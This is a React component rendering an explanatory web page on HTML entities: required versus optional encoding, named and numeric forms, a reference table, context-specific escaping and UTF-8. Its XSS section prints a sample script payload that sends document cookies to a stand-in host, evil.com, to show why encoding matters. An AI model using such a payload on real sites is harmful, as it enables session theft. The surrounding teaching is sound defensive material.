export default function HtmlEntitiesContent() {
    return (
        <div style={{ maxWidth: 1000, margin: '0 auto', padding: '64px 16px 0' }}>
            <div>

                <section style={{ marginBottom: 48 }}>
                    <h2 style={{ fontFamily: 'Outfit, sans-serif', fontWeight: 700, fontSize: 'clamp(18px, 2.5vw, 24px)', color: 'var(--ink)', letterSpacing: '-0.02em', marginBottom: 16 }}>
                        What are HTML entities and why do they exist?
                    </h2>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 14 }}>
                        HTML entities are special sequences of characters used to represent characters that either have special meaning in HTML or cannot be reliably typed in all environments. Every entity starts with an ampersand (<code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13, background: 'var(--border)', padding: '1px 5px', borderRadius: 3 }}>&</code>) and ends with a semicolon (<code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13, background: 'var(--border)', padding: '1px 5px', borderRadius: 3 }}>;</code>).
                    </p>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 14 }}>
                        HTML parsers use certain characters to define markup: <strong style={{ color: 'var(--ink)' }}>&lt;</strong> opens a tag, <strong style={{ color: 'var(--ink)' }}>&gt;</strong> closes one, and <strong style={{ color: 'var(--ink)' }}>&amp;</strong> begins an entity reference itself. If you want to display the literal text <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13, background: 'var(--border)', padding: '1px 5px', borderRadius: 3 }}>2 &lt; 5</code> in a browser, you cannot write the raw less-than sign — the parser would try to open a tag. Entities solve this by providing a safe, unambiguous representation.
                    </p>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)' }}>
                        Beyond required characters, entities also allow you to include characters that may be difficult to type on a keyboard or that might be stripped or corrupted by text editors and transmission protocols. The copyright symbol ©, the em dash —, and non-breaking spaces are common examples of characters that are best represented as entities.
                    </p>
                </section>

                <section style={{ marginBottom: 48 }}>
                    <h2 style={{ fontFamily: 'Outfit, sans-serif', fontWeight: 700, fontSize: 'clamp(18px, 2.5vw, 24px)', color: 'var(--ink)', letterSpacing: '-0.02em', marginBottom: 16 }}>
                        Required entities vs optional ones
                    </h2>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 16 }}>
                        Not all HTML encoding is mandatory. Understanding which characters must be encoded and which are optional helps you avoid unnecessary verbosity while maintaining correctness.
                    </p>
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: 14, marginBottom: 16 }}>
                        <div style={{ padding: '20px', background: 'var(--red-lt)', border: '1px solid rgba(220,38,38,.2)', borderRadius: 'var(--r-l)' }}>
                            <div style={{ fontSize: 15, fontWeight: 700, color: 'var(--ink)', marginBottom: 10 }}>Must encode</div>
                            <ul style={{ paddingLeft: 18, fontSize: 14, color: 'var(--ink-2)', lineHeight: 1.9, margin: 0 }}>
                                <li><code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13 }}>&amp;</code> → &amp;amp; (always)</li>
                                <li><code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13 }}>&lt;</code> → &amp;lt; (in content)</li>
                                <li><code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13 }}>&gt;</code> → &amp;gt; (in content)</li>
                                <li><code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13 }}>"</code> → &amp;quot; (in double-quoted attrs)</li>
                                <li><code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13 }}>'</code> → &amp;apos; (in single-quoted attrs)</li>
                            </ul>
                        </div>
                        <div style={{ padding: '20px', background: 'var(--green-lt)', border: '1px solid var(--green-mid)', borderRadius: 'var(--r-l)' }}>
                            <div style={{ fontSize: 15, fontWeight: 700, color: 'var(--ink)', marginBottom: 10 }}>Optional (but good practice)</div>
                            <ul style={{ paddingLeft: 18, fontSize: 14, color: 'var(--ink-2)', lineHeight: 1.9, margin: 0 }}>
                                <li>© → &amp;copy; (readable alternative)</li>
                                <li>— → &amp;mdash; (semantic clarity)</li>
                                <li>Non-breaking space → &amp;nbsp;</li>
                                <li>€ → &amp;euro; (safe across encodings)</li>
                                <li>Any Unicode above U+007F in ASCII files</li>
                            </ul>
                        </div>
                    </div>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)' }}>
                        If your HTML file is saved as UTF-8 (the universal standard since HTML5), you can include any Unicode character directly without encoding. The main reason to encode non-ASCII characters is legacy compatibility — older systems, email clients, and some templating engines may mangle Unicode. For modern web applications using UTF-8 consistently, only the five required characters need encoding.
                    </p>
                </section>

                <section style={{ marginBottom: 48 }}>
                    <h2 style={{ fontFamily: 'Outfit, sans-serif', fontWeight: 700, fontSize: 'clamp(18px, 2.5vw, 24px)', color: 'var(--ink)', letterSpacing: '-0.02em', marginBottom: 16 }}>
                        Named vs numeric (decimal) vs numeric (hex) entities
                    </h2>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 16 }}>
                        HTML supports three forms for every character entity, and all three produce identical output in the browser:
                    </p>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginBottom: 16 }}>
                        {[
                            { type: 'Named entity', format: '&amp;name;', example: '&amp;lt;', result: '<', desc: 'Uses a human-readable name defined in the HTML specification. Limited to characters that have been assigned names — not every Unicode character has one.' },
                            { type: 'Decimal numeric', format: '&amp;#number;', example: '&amp;#60;', result: '<', desc: 'Uses the decimal Unicode code point. Works for any Unicode character (code points 0–1,114,111). No memorization needed — look up the code point and use it.' },
                            { type: 'Hex numeric', format: '&amp;#xHex;', example: '&amp;#x3C;', result: '<', desc: 'Uses the hexadecimal Unicode code point with an x prefix. Preferred by developers familiar with Unicode since Unicode documentation uses hex (U+003C = 0x3C).' },
                        ].map(({ type, format, example, result, desc }, i) => (
                            <div key={type} style={{ padding: '14px 16px', background: i % 2 === 0 ? 'var(--white)' : 'var(--page-bg)', border: '1px solid var(--border)', borderRadius: 'var(--r-l)' }}>
                                <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8, flexWrap: 'wrap' }}>
                                    <span style={{ fontSize: 13, fontWeight: 700, color: 'var(--ink)' }}>{type}</span>
                                    <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 12, color: 'var(--ink-3)', background: 'var(--page-bg)', padding: '2px 8px', borderRadius: 4 }}>{format}</code>
                                    <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13, color: 'var(--green)', background: 'var(--green-lt)', padding: '2px 8px', borderRadius: 4 }}>{example} → {result}</code>
                                </div>
                                <p style={{ fontSize: 13, color: 'var(--ink-3)', lineHeight: 1.6, margin: 0 }}>{desc}</p>
                            </div>
                        ))}
                    </div>
                </section>

                <section style={{ marginBottom: 48 }}>
                    <h2 style={{ fontFamily: 'Outfit, sans-serif', fontWeight: 700, fontSize: 'clamp(18px, 2.5vw, 24px)', color: 'var(--ink)', letterSpacing: '-0.02em', marginBottom: 16 }}>
                        XSS prevention — why HTML encoding is a security critical practice
                    </h2>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 14 }}>
                        Cross-Site Scripting (XSS) is consistently one of the OWASP Top 10 most critical web security vulnerabilities. It occurs when an attacker injects malicious client-side scripts into a web page that other users view. The attack works because the browser cannot distinguish between intentional JavaScript and injected code — it executes both.
                    </p>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 16 }}>
                        The classic attack scenario: a comment field allows user input. An attacker submits <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 12, background: 'var(--border)', padding: '1px 5px', borderRadius: 3 }}>{"<script>fetch('evil.com?c='+document.cookie)</script>"}</code>. If the application renders this raw HTML, every user who views the comment page has their session cookie exfiltrated.
                    </p>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginBottom: 16 }}>
                        {[
                            { label: 'Vulnerable — raw rendering', code: `// DANGEROUS: renders user input as HTML\ndocument.getElementById('comment').innerHTML = userInput;`, color: 'var(--red)', bg: 'var(--red-lt)', border: 'rgba(220,38,38,.2)' },
                            { label: 'Safe — HTML encoded', code: `// SAFE: encodes special characters before rendering\nconst el = document.createElement('div');\nel.appendChild(document.createTextNode(userInput));\ncontainer.appendChild(el);`, color: 'var(--green)', bg: 'var(--green-lt)', border: 'var(--green-mid)' },
                        ].map(({ label, code, color, bg, border }) => (
                            <div key={label} style={{ padding: '14px 16px', background: bg, border: `1px solid ${border}`, borderRadius: 'var(--r-l)' }}>
                                <div style={{ fontSize: 13, fontWeight: 700, color, marginBottom: 8 }}>{label}</div>
                                <pre style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 12, color: 'var(--ink-2)', margin: 0, lineHeight: 1.7, overflowX: 'auto', maxWidth: '100%' }}>{code}</pre>
                            </div>
                        ))}
                    </div>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)' }}>
                        Modern frameworks like React, Vue, and Angular HTML-encode content by default. React's JSX uses <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13, background: 'var(--border)', padding: '1px 5px', borderRadius: 3 }}>dangerouslySetInnerHTML</code> as an explicit opt-in to raw HTML rendering — the name is intentional. If you bypass framework defaults to render raw HTML, you must encode user input manually.
                    </p>
                </section>

                <section style={{ marginBottom: 48 }}>
                    <h2 style={{ fontFamily: 'Outfit, sans-serif', fontWeight: 700, fontSize: 'clamp(18px, 2.5vw, 24px)', color: 'var(--ink)', letterSpacing: '-0.02em', marginBottom: 16 }}>
                        Complete reference of the most important HTML entities
                    </h2>
                    <div style={{ overflowX: 'auto' }}>
                        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13 }}>
                            <thead>
                                <tr style={{ background: 'var(--bg-accent)', color: '#fff' }}>
                                    {['Character', 'Named Entity', 'Decimal', 'Hex', 'Category'].map(h => (
                                        <th key={h} style={{ padding: '10px 12px', textAlign: 'left', fontWeight: 600, fontFamily: 'Outfit, sans-serif' }}>{h}</th>
                                    ))}
                                </tr>
                            </thead>
                            <tbody>
                                {[
                                    ['&',  '&amp;amp;',   '&amp;#38;',   '&amp;#x26;', 'Required'],
                                    ['<',  '&amp;lt;',    '&amp;#60;',   '&amp;#x3C;', 'Required'],
                                    ['>',  '&amp;gt;',    '&amp;#62;',   '&amp;#x3E;', 'Required'],
                                    ['"',  '&amp;quot;',  '&amp;#34;',   '&amp;#x22;', 'Required in attrs'],
                                    ["'",  '&amp;apos;',  '&amp;#39;',   '&amp;#x27;', 'Required in attrs'],
                                    ['\u00A0','&amp;nbsp;','&amp;#160;',  '&amp;#xA0;', 'Whitespace'],
                                    ['©',  '&amp;copy;',  '&amp;#169;',  '&amp;#xA9;', 'Legal'],
                                    ['®',  '&amp;reg;',   '&amp;#174;',  '&amp;#xAE;', 'Legal'],
                                    ['™',  '&amp;trade;', '&amp;#8482;', '&amp;#x2122;','Legal'],
                                    ['—',  '&amp;mdash;', '&amp;#8212;', '&amp;#x2014;','Typography'],
                                    ['–',  '&amp;ndash;', '&amp;#8211;', '&amp;#x2013;','Typography'],
                                    ['…',  '&amp;hellip;','&amp;#8230;', '&amp;#x2026;','Typography'],
                                    ['€',  '&amp;euro;',  '&amp;#8364;', '&amp;#x20AC;','Currency'],
                                    ['£',  '&amp;pound;', '&amp;#163;',  '&amp;#xA3;', 'Currency'],
                                ].map(([char, named, dec, hex, cat], i) => (
                                    <tr key={named} style={{ background: i % 2 === 0 ? 'var(--white)' : 'var(--page-bg)', borderBottom: '1px solid var(--border)' }}>
                                        <td style={{ padding: '8px 12px', fontFamily: 'JetBrains Mono, monospace', fontSize: 15, fontWeight: 700, color: 'var(--ink)' }}>{char}</td>
                                        <td style={{ padding: '8px 12px', fontFamily: 'JetBrains Mono, monospace', fontSize: 12, color: 'var(--green)' }}>{named}</td>
                                        <td style={{ padding: '8px 12px', fontFamily: 'JetBrains Mono, monospace', fontSize: 12, color: 'var(--ink-3)' }}>{dec}</td>
                                        <td style={{ padding: '8px 12px', fontFamily: 'JetBrains Mono, monospace', fontSize: 12, color: 'var(--ink-4)' }}>{hex}</td>
                                        <td style={{ padding: '8px 12px', fontSize: 12, color: 'var(--ink-3)' }}>{cat}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </section>

                <section style={{ marginBottom: 48 }}>
                    <h2 style={{ fontFamily: 'Outfit, sans-serif', fontWeight: 700, fontSize: 'clamp(18px, 2.5vw, 24px)', color: 'var(--ink)', letterSpacing: '-0.02em', marginBottom: 16 }}>
                        Encoding in different contexts
                    </h2>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                        {[
                            { ctx: 'HTML element content', rule: 'Encode &, <, and > at minimum. These three prevent tag injection and entity-sequence injection.', example: '<p>&lt;script&gt; is not a real tag here</p>' },
                            { ctx: 'HTML attribute values (double-quoted)', rule: 'Encode &amp; and &quot; in addition to < and >. A literal double quote would close the attribute.', example: '<input value="5 &gt; 3 &amp;&amp; x &lt; 10">' },
                            { ctx: 'HTML attribute values (single-quoted)', rule: 'Encode &amp; and &apos; (or &#39;). Single-quoted attributes need the apostrophe escaped instead of the double quote.', example: "<input value='O&#39;Brien'>" },
                            { ctx: 'JavaScript strings in HTML', rule: 'Never embed raw user data in JavaScript script blocks using only HTML encoding. JavaScript strings in HTML need both JavaScript string escaping and HTML encoding. Prefer data attributes or JSON instead.', example: '<!-- UNSAFE: -->\n<script>var name = "<?= htmlspecialchars($name) ?>";</script>' },
                            { ctx: 'URL query parameters', rule: 'HTML encoding is separate from URL encoding. Use encodeURIComponent() for URL parameters — &amp; in a URL is the HTML entity for the separator character, not the URL-encoded value.', example: '<a href="?q=hello%20world&amp;lang=en">Search</a>' },
                        ].map(({ ctx, rule, example }, i) => (
                            <div key={ctx} style={{ padding: '14px 16px', background: i % 2 === 0 ? 'var(--white)' : 'var(--page-bg)', border: '1px solid var(--border)', borderRadius: 'var(--r-l)' }}>
                                <div style={{ fontSize: 14, fontWeight: 700, color: 'var(--ink)', marginBottom: 6 }}>{ctx}</div>
                                <p style={{ fontSize: 13, color: 'var(--ink-2)', lineHeight: 1.6, margin: '0 0 8px' }}>{rule}</p>
                                <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 11, color: 'var(--green)', background: 'var(--green-lt)', padding: '4px 8px', borderRadius: 4, display: 'block', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{example}</code>
                            </div>
                        ))}
                    </div>
                </section>

                <section style={{ marginBottom: 48 }}>
                    <h2 style={{ fontFamily: 'Outfit, sans-serif', fontWeight: 700, fontSize: 'clamp(18px, 2.5vw, 24px)', color: 'var(--ink)', letterSpacing: '-0.02em', marginBottom: 16 }}>
                        Character encoding — UTF-8, ASCII, and how entities relate
                    </h2>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 14 }}>
                        ASCII (American Standard Code for Information Interchange) defines 128 characters using 7 bits: the basic Latin alphabet, digits, punctuation, and control characters. HTML was originally designed to work within ASCII, which is why characters outside ASCII needed entity references — the underlying encoding might not support them.
                    </p>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)', marginBottom: 14 }}>
                        UTF-8 is a variable-length encoding that covers all 1,114,112 Unicode code points. It uses 1 byte for ASCII characters (backward compatible) and up to 4 bytes for emoji and rare scripts. <strong style={{ color: 'var(--ink)' }}>HTML5 mandates UTF-8</strong> as the document encoding and modern servers declare it via <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: 13, background: 'var(--border)', padding: '1px 5px', borderRadius: 3 }}>Content-Type: text/html; charset=utf-8</code>.
                    </p>
                    <p style={{ fontSize: 15, lineHeight: 1.75, color: 'var(--ink-2)' }}>
                        With UTF-8 declared, you can include any Unicode character — emoji, Chinese characters, mathematical symbols — directly in your HTML without entities. The only characters that still require entities are the five that have special HTML meaning (&amp;, &lt;, &gt;, &quot;, &apos;). HTML entities for other characters (&amp;copy;, &amp;euro;, &amp;mdash;) are now purely a readability preference, not a necessity.
                    </p>
                </section>

            </div>
        </div>
    );
}
